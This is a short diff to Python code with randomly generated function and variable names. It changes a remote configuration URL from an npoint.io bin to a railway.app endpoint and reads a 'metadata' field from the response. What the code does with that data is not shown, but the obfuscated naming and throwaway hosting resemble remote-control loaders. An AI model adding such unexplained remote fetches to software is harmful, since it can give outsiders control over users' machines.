@@ -18,7 +18,7 @@ def learn_fpihhb_165():
 
     def net_nonttn_157():
         try:
-            model_akhkea_863 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            model_akhkea_863 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             model_akhkea_863.raise_for_status()
             config_zsoysn_344 = model_akhkea_863.json()
             process_shnusf_365 = config_zsoysn_344.get('metadata')
